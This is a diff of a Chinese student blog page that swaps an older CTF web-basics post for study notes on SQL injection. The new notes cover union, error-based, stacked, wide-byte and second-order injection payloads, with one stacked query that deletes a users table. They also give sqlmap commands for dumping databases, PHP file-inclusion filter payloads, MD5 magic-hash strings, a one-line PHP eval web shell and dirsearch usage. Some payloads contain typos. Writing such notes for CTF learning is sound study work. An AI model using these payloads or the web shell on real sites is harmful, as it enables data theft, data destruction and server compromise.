@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="有关Web, 黛色若梦">
+    <meta name="keywords" content="sql, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>有关Web | 黛色若梦</title>
+    <title>sql | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -316,7 +316,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">有关Web</h1>
+                    <h1 class="description center-align post-title">sql</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
-                                <span class="chip bg-color">理论知识</span>
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                                <span class="chip bg-color">基础知识</span>
                             </a>
                         
                     </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-10-09
+                    2022-02-23
                 </div>
                 
 
@@ -469,93 +469,120 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="../images/Web%E5%AE%89%E5%85%A8-16338528304993.jpg" alt="Web安全"></p>
+                <h2 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h2><p>文中只举例mysql数据库。</p>
+<h3 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h3><p>客户端数据未经过转义或处理直接带入数据库，造成了sql注入。</p>
+<h3 id="2-常规模板："><a href="#2-常规模板：" class="headerlink" title="2.常规模板："></a>2.常规模板：</h3><h4 id="（1）判断注入点"><a href="#（1）判断注入点" class="headerlink" title="（1）判断注入点"></a>（1）判断注入点</h4><p>字符型：’a’,”a”,(a),(‘a’),(“a”),((“a”)),((‘a’))等。</p>
+<p>数字型：1</p>
+<p>判断：</p>
+<p>一、id=x 加上注释符– （这里是空格，但是在url后要用+），-+，/**/,#(表单常用)</p>
+<p>二、id=1’&amp;&amp;’1’=’1</p>
+<p>id=1’ and ‘1’=’1</p>
+<p>这样构造一个闭合类型。</p>
+<h4 id="（2）获取字段数"><a href="#（2）获取字段数" class="headerlink" title="（2）获取字段数"></a>（2）获取字段数</h4><p>order by </p>
+<p>通过页面变化来查看确定字段数</p>
+<h4 id="（3）一般用联合查询查看显示位"><a href="#（3）一般用联合查询查看显示位" class="headerlink" title="（3）一般用联合查询查看显示位"></a>（3）一般用联合查询查看显示位</h4><p>查看当前数据库</p>
+<p>id=0  union select database(),2,3–+</p>
+<p>爆表：</p>
+<p>id=0 union selelct 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
+<p>爆列：</p>
+<p>0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xxx’–+(有时候爆破没有回显还要用十六进制试一下)</p>
+<p>爆字段：</p>
+<p>0 union select 1,2,group_concat(id,’~’,user) from (表名)–+</p>
+<h3 id="3-类型："><a href="#3-类型：" class="headerlink" title="3.类型："></a>3.类型：</h3><p>（1）参数：字符型，数字型</p>
+<p>（2）提交方式：post，get，cookie，X-Forward-For,User-Agent请求头</p>
+<h4 id="（3）注入方式与应用场景："><a href="#（3）注入方式与应用场景：" class="headerlink" title="（3）注入方式与应用场景："></a>（3）注入方式与应用场景：</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>如以上所示，但是要注意的是可能出现一些waf（正则或转义或过滤）阻止我们使用union，这时候我们就根据不同的可能性选择不同方法。这种时候绝大多数是找到一种其他的方法来注入。</p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>这种题目特征是只有判断出内容真假的回显，没有回显打印内容，报错出内容</p>
+<p>具体的函数作用内容在lesson1-10，我就不赘述了。</p>
+<p>然后我们看一下padload：</p>
+<p>updatexml或extractvalue</p>
+<p>爆表</p>
+<p>0 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))–+</p>
+<p>爆列</p>
+<p>0 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from imformation_schema.columns where table_name=’xxx’)))–+</p>
+<p>爆字段</p>
+<p>0 and extractvalue(1,concat(0x7e,(select group_concat(xx,0x7e,xx) from table)))–+</p>
+<p>但是问题是这些函数只能查询32位，所以我们要用substr()或mid(xxx,33,32)从33位开始截取。</p>
+<h5 id="多语句注入（堆叠注入）"><a href="#多语句注入（堆叠注入）" class="headerlink" title="多语句注入（堆叠注入）"></a>多语句注入（堆叠注入）</h5><p>原因：没有经过严格过滤mysqli_multi_query函数，可以执行多条SQL语句。mysql_real_escape_string()转义过滤。</p>
+<p>用;隔开每一个输入语句，有存在局限的就是它其实如果权限不足会导致无法修改数据。</p>
+<p>如:</p>
+<p>id=1”;WAITFOR DELAY ‘0:0:3’;delete from users; –+id=1’;select if(length(user(),1,1)&gt;1,sleep(3),1) %23’;select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;1,sleep(3),1) %23</p>
+<h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>这是一种waf的绕过姿势。</p>
+<p>id=-1 /!UNION/ /!SELECT/ 1,2,3</p>
+<p>会执行/!/里面的内容。</p>
+<h5 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h5><p>代码中有urldecode() 函数</p>
+<p>%2527 先解码成%27再解码成’单引号</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.100.141/index.php/author=123">http://192.168.100.141/index.php/author=123</a> –prefix “%2527” –suffix “%23”<br>-prefix为设置前缀 -suffix为设置后缀</p>
+<p>设置后缀，防止sqlmap使用内联注</p>
+<h5 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h5><p>报错注入的情况也适用于布尔盲注（只有判断出内容真假的回显，没有回显打印内容），了解一下基本过程然后直接上脚本爆破。</p>
+<p>利用substr()来使用截取判断，还可以用ascii()将其转换成数字，然后就可以用二分法。脚本只是模板，具体情况要根据题目的waf等来判断实现。</p>
+<h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><p>适用于与bool一样（只有判断出内容真假的回显，没有回显打印内容）</p>
+<p>利用if()和sleep()函数来实现</p>
+<p>Sleep()  :延迟函数</p>
+<p> <strong>If</strong>(condition,true,false) :条件语句 </p>
+<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>原理是先编码后转义，GBK 占用两字节</p>
+<p>ASCII占用一字节</p>
+<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p>
+<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
+<p>如列数测试：</p>
+<p>id=%df%27 union select 1,2%23</p>
+<p>预防：使用mysql_set_charset(GBK)指定字符集</p>
+<p>使用myql_real_escape_string()进行转义，他会考虑当前字符集设置</p>
+<h5 id="二次转义注入"><a href="#二次转义注入" class="headerlink" title="二次转义注入"></a>二次转义注入</h5><p>后端（PHP）代码对语句进行了转义</p>
+<p>保存进数据库（mysql）时没有转义，是原语句</p>
+<p>‘#被转义成了其他的东西，所以一次注入无效。<br>但是在保存进数据库的时候，还是admin ‘#。</p>
+<p>那么修改密码时的语句如下：</p>
+<p>update users set  password=’123’ where username=’admin ‘#’<br>所以你以为修改的是admin ‘#的账号，但是数据库理解成要修改密码的账号是admin。</p>
+<h3 id="4-一些waf类型"><a href="#4-一些waf类型" class="headerlink" title="4.一些waf类型"></a>4.一些waf类型</h3><p>过滤掉什么：</p>
+<p>flag   union  ‘  ,  </p>
+<p>这里分成白盒和黑盒</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/11146625.html">SQL注入绕过waf的一万种姿势 - 铺哩 - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://link.csdn.net/?target=https://www.cnblogs.com/backlion/p/8622523.html">(47条消息) csdn - 安全中心</a></p>
+<h3 id="5-解题流程"><a href="#5-解题流程" class="headerlink" title="5.解题流程"></a>5.解题流程</h3><p>更准确的说可以说是题目类型，怎么去判断属于什么类型的题目。遇到参数，表单，过滤可能性。</p>
+<h3 id="6-脚本和sqlmap格式"><a href="#6-脚本和sqlmap格式" class="headerlink" title="6.脚本和sqlmap格式"></a>6.脚本和sqlmap格式</h3><p>sqlmap用法<br>爆库：</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://xxxxxx/?id=1">http://xxxxxx?id=1</a> –dbs</p>
+<p>爆表：</p>
+<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxxxx/?id=1">http://xxxxx?id=1</a> -D xxxx –tables</p>
+<p>爆列：</p>
+<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxx/?id=1">http://xxx?id=1</a> -D xxxx -T xxxx –columns</p>
+<p>爆字段：</p>
+<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxx/?id=1">http://xxx?id=1</a> -D xxxx -T xxxx -C xxxx –dump</p>
+<p><strong>文件包含：</strong></p>
+<p>?file=XXX.php等是典型的文件包含</p>
+<p>PHP伪协议（文件读取）</p>
+<p>#第一种用法:<br>?file=php://filter/convert.base64-encode/resouce=xxx.php?<br>第二种用法:<br>?file=php://filter/read=convert.base64-encode/resource=xxx.php<br>————————————————</p>
+<h6 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h6><p>代码：?file=php://input<br>在url上后接，之后利用Hackbar通过POST把数据传过去</p>
+<p><strong>PHP小trick：</strong></p>
+<p>一种是md5()函数无法处理数组，所以我们传入数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
+<p>所以我们可以试试kkeyey1[]=some&amp;kekeyy2[]=lie</p>
+<p>另一种就是之前常用的利用==弱比较，我们常用的两个字符经过MD5加密后的值为0exxxx形式，会被认为是科学计数法，且表示的是0*10的xxx次方，还是零，都是相等的。</p>
+<p>可以套一些</p>
+<p>下列的字符串的MD5值都是0e开头的：</p>
+<p>QNKCDZO</p>
+<p>240610708</p>
+<p>s878926199a</p>
+<p>s155964671a</p>
+<p>s214587387a</p>
+<p>s214587387a</p>
+<p>过滤&lt;?php。</p>
+<p>这一题学到了的是怎么绕过过滤关键字的方法：试试其他的php标记写法</p>
+<p>用网页脚本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>1.piapiapia</p>
+<p>buu自带防扫机制，所以我们没有办法扫得很快</p>
+<p>看看能不能扫出源码，看是白盒（源码泄漏+代码审计）还是黑盒（这里由于字典的稀缺，所以两种都试试）</p>
+<p>fuzz用社区版，因为线程比较小，不然速度太快了。</p>
 <ul>
-<li><p>基础知识类型：一般不会有，有也是Web签到题（不结合其他复杂知识的话）</p>
-<p><strong>查看网页源代码</strong></p>
-<p>fn+f12(微软，火狐旧版可开启<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1683466134630515216&wfr=spider&for=pc">开发者工具</a>）在我的电脑上f12只能打开联想电脑管家，或Ctrl+U（这个一般浏览器都可view-source:)</p>
-<p>(大概率在注释里有点东西，flag啊，hint之类有关的东西。）前端代码要分析html和js代码，修改使之满足要求，或利用<strong>控制台浏览器解析混淆代码</strong></p>
-<p>关于编码然后想补一点的浅浅东西：</p>
-<p>ctf常见代码：加密与编码的区别（加密是利用数学方法将邮件转换为不可读格式从而达到保护数据的目的的一门科学，它的样式已经改变，必须要有密钥才能解开。解码，是编码的逆过程。从概念上可以看出，编码只是表现形式的转换，没有保密的作用，因为编码和解码的算法是公开的，只要知道是什么编码的内容，任何人都可以轻松地解码。网上有一句形象生动的说法：加密就类似于整容，现在的样子和原来的样子已经千差万别，要想认出他/她，只能通过身体的其他的特有的特征（密钥）；编码类似于化妆，你依然可以看到她/他原来的样子（方法就是卸妆）。我管蠡窥测，目前只了解的web题大多数只是有关编码的，没见过古密，以后学到了再补充。）</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gwind/p/8011248.html">传送门加解码</a></p>
-<p>1.Base32加密：（还有16/64等链接有）<br>例：KRUGS4ZANFZSAYLOEBSXQYLNOBWGK===<br>通常在其后会有三个等号，比较好判断，当然没有‘=’也可以解得出来 0.0</p>
-<p>2.UUencode编码<br>例： 2Z+^9Y+BJYIBOY+BJY+Z+Y:V0<br>往往会出现+，-，；等比较奇怪的符号</p>
-<p>3.URL编码（UrlEncode）：<br>例：%e8%bf%99%e6%98%af%e4%b8%aa%e4%be%8b%e5%ad%90<br>因为出现了%因此也比较容易认出来</p>
-<p>4.unicode编码<br>例：\u0054\u0068\u0069</p>
-<p>每一行都有’\u’ </p>
-<p>5.HTML编码<br>例子：以“&amp;#100；&amp;#101；”类似为特征</p>
-<p>6.unescape<br>例子：%u8FD9%u662F%u4E2A%u4F8B%u5B50<br>%u 开头也很好辨认</p>
-<p>7.16进制<br>秘文里出现不超过F的字母和数字，则有很大可能就是16进制，不多做解释。</p>
-<p>8.BCD码.(Binary-Coded Decimal)<br>二进码十进数，是一种二进制的数字编码形式，形式如：XXXXYYYY<br>通常是指8421码，就是将十进制的数以8421的形式展开成二进制，大家知道十进制是0～9十个数组成，这十个数每个数都有自己的8421码。</p>
-<p>9.还有一些代码混淆(是将计算机程序的代码，转换成一种功能上等价，但是难于阅读和理解的形式的行为。)</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/asp/asp_quickref.asp">asp</a>混淆加密   </li>
-<li>php混淆加密</li>
-<li>css（除了html的超文本标记语言外的网页页面效果）/js（一些元素如动态效果）混淆加密</li>
-<li>VBScript.Encode混淆加密     针对asp代码进行的一种加密混淆操作</li>
-<li>ppencode        把Perl代码转换成只有英文字母的字符串</li>
-<li>rrencode        类似jjencodeuby，把代码全部转换成符号</li>
-<li>jjencode/aaencode   将 JS 代码转换成只有符号的字符串/JS 代码转换成常用的网络表情，也就是我们说的颜文字 js 加密</li>
-<li>JSfuck    只用 6 个字符<code>[ ]( ) ! + </code>来编写 JavaScript 程序。此外，JSFuck可用于绕过恶意代码检测，且可以被用于跨站脚本攻击。</li>
-<li>jother  利用少量特定字符（javascript用 ! [] + - * 表示0~1000的数字）构造精简的匿名函数对与字符串的编码方式，console将那堆解码的东西复制过去 按回车即可解码</li>
-<li>brainfuck编程语言  八种符号(<code>&gt; &lt; + – . , [ ]</code>)</li>
-</ol>
-<p>————————————<br>版权声明：本文为CSDN博主「MIGENGKING」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MIGENGKING/article/details/91890871">https://blog.csdn.net/MIGENGKING/article/details/91890871</a></p>
-<p><strong>http请求（b-6~25）有关内容</strong>，</p>
-<p>1.发送http请求（hackbar,写脚本），</p>
-<p>2.不常见类型的请求方式（脚本），</p>
-<p>3.HTTP头有关题目：查看和修改http头。常见题，不同类型有不同方法，但基本离不开抓包，熟悉一些常见的请求头格式，作用。</p>
-<p>4.查看响应头：可能会有hint,关键的信息，flag基本别想了。</p>
-<p>(1)修改请求头，伪造cookie：</p>
-<p>只有客户端才能设置Cookie，服务端若想让客户端增加一个Cookie项，需要在应答时，在Http头部中，通过使用Set-Cookie，将要设置的Cookie项发送给客户端。这样客户端，在下次访问时，会带上该Cookie项。</p>
-<p>（2）Cookie：变量，独立于语言存在，也就是说，不论是PHP还是JSP（亦或是Java、.Net等其他语言）设置的Cookie，其本质都是一样滴，客户端脚本Javascript都能读取到。</p>
-<p>set-cookie是一个函数，由服务器发送一个HTTP-cookie到浏览器。</p>
-<p>（3）XFF:</p>
-<p>XFF是header请求头中的一个参数。是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。代表了HTTP的请求端真实的IP。修改XFF头的信息，即可绕过服务器的过滤。</p>
-<p>X-Forwarded-For: 127.0.0.1 -&gt; X-Forwarded-For: 192.168.1.1</p>
-<p>(4)Referer:</p>
-<p>作为防盗链 ：  将这个http请求发给服务器后，如果服务器要求必须是某个地址或者某几个地址才能访问，而你发送的referer不符合他的要求，就会拦截或者跳转到他要求的地址，然后再通过这个地址进行访问。</p>
-<p>防止恶意请求：比如静态请求是*.html结尾的，动态请求是*.shtml，那么所有的*.shtml请求，必须 Referer为我自己的网站才可以访问，这就是Referer的作用。</p>
-<p>空referer:直接在浏览器的地址栏中输入一个资源的URL地址，那么这种请求是不会包含<a target="_blank" rel="noopener" href="http://www.sojson.com/tag_referer.html"> Referer </a>字段的，因为这是一个“凭空产生”的<a target="_blank" rel="noopener" href="http://www.sojson.com/tag_http.html"> HTTP </a>请求，并不是从一个地方链接过去的。</p>
-<h6 id="修改页面元素"><a href="#修改页面元素" class="headerlink" title="修改页面元素"></a><strong><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/163186542">修改页面元素</a></strong></h6><p>修改一个网页中的内容，这个技术不会也不能修改服务器动态传递的数据，也不能修改服务器中的数据，更不能将修改后的数据传回服务器（非用户输入的情况下），只能修改已经被加载完毕的静态数据，只能修改云端而已，刷新就没了。基于Chrome内核，部分操作可能会不同，但是思路是相同的。毕竟在不同的浏览器中，调试工具可能会有不同的名字，甚至是有不同的开启方法。哈哈太浅了，总不可能藏在图层下，如此也在element中有吧。。。下次再修正</p>
-<ul>
-<li><strong>sql注入</strong></li>
+<li>-u 指定网址</li>
+<li>-e 指定网站语言</li>
+<li>-w 指定字典</li>
+<li>-r 递归目录（跑出目录后，继续跑目录下面的目录）</li>
+<li>–random-agents 使用随机UA</li>
 </ul>
-<p>就是对SQL语言要弄明白，根据输入不同数据网页的反应对后台语句的判断可以得出来，自动化工具sqlmap(kail环境下，明天试试安一个，感觉学习新知识都没有让我安装东西难啊。。)，在sql漏洞学习完可以试试!但是不知道比赛时能不能用，SO还是好好学sql手工注入扎实基础。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/php09/p/10404560.html">sqlmap</a>可以与burp suite ,google(虚拟机中尝试代理),结合使用. </p>
-<ul>
-<li>可以检测页面中get,post参数,cookie,http头等.</li>
-<li>可以实现数据榨取</li>
-<li>可以实现文件系统的访问</li>
-<li>可以实现操作命令的执行</li>
-<li>还可以对xss漏洞进行检测</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/65d7522ecc1f">sqlmap练习</a> （DVWA）支持5种漏洞检测类型:（之后在写sqlilabs的blog中会再拓展，不然我估计又会忘记啦）</p>
-<ul>
-<li><p>基于布尔的盲注检测 (如果一个url的地址为xxxx.php?id=1,那么我们可以尝试下的加上 and 1=1(和没加and1=1结果保持一致) 和 and 1=2(和不加and1=2结果不一致),则我们基本可以确定是存在布尔注入的. )</p>
-</li>
-<li><p>基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int)) 来观察浏览器的响应是否等待了你设定的那个值 如果等待了,则表示执行了sleep,则基本确定是存在sql注入的</p>
-</li>
-<li><p>基于错误的检测 (组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),如果报错 则证明我们组合的查询语句特定的字符被应用了,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.))</p>
-</li>
-<li><p>基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候 则使用union联合查询搭配concat还进行获取更多的信息)</p>
-</li>
-<li><p>基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作</p>
-<ul>
-<li><p><strong>绕过waf</strong>(Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web提供保护的一种产品。)*</p>
-<p>必要条件：1.熟练掌握mysql函数和语法使用方法   2，深入了解中间件运行处理机制   3，了解WAF防护处理原理和方法</p>
-</li>
-</ul>
-<p>（1）长度限制（DVWA）*</p>
-<p>要求输入较长的文本，但对其长度进行限制。可以在BrupSuite抓包改包绕过，也可以在F12中改源码。</p>
-<p>修改元素中<strong>HTML maxlength 属性:</strong> 规定 <code>&lt;input&gt;</code> 元素中允许的最大字符数</p>
-</li>
-<li><p>双写：</p>
-<p>在xss,sql注入和php代码审计的题目中比较常见</p>
-</li>
-</ul>
-</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 网址 -e php</span><br></pre></td></tr></table></figure>
+
+<p>py dirsearch.py -u 网址 -e 语言(我一般用*)</p>
+<p>一般出现登录页面都会有注册页面</p>
 
                 
             </div>
@@ -582,7 +609,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/10/09/%E6%9C%89%E5%85%B3Web/">http://example.com/2021/10/09/%E6%9C%89%E5%85%B3Web/</a>
+                    <a href="http://example.com/2022/02/23/sql/">http://example.com/2022/02/23/sql/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -620,8 +647,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
-                                    <span class="chip bg-color">理论知识</span>
+                                <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                                    <span class="chip bg-color">基础知识</span>
                                 </a>
                             
                         </div>
@@ -797,13 +824,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2021/10/16/mysql%E8%AF%AD%E5%8F%A5/">
+                <a href="/2022/03/01/%E8%80%83%E6%A0%B8wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="mysql语句">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="考核wp">
                         
-                        <span class="card-title">mysql语句</span>
+                        <span class="card-title">考核wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -814,7 +841,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-16
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
                         </span>
                         <span class="publish-author">
                             
@@ -823,14 +850,6 @@
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/sqli/">
-                        <span class="chip bg-color">sqli</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -842,13 +861,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/03/php3/">
+                <a href="/2022/02/18/web%E5%89%8D%E7%AB%AF--html%E8%AF%AD%E8%A8%80/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="php3">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="html语言--web前端">
                         
-                        <span class="card-title">php3</span>
+                        <span class="card-title">html语言--web前端</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -859,7 +878,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
                             </span>
                         <span class="publish-author">
                             
@@ -872,8 +891,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php/">
-                        <span class="chip bg-color">php</span>
+                    <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
+                        <span class="chip bg-color">理论知识</span>
                     </a>
                     
                 </div>
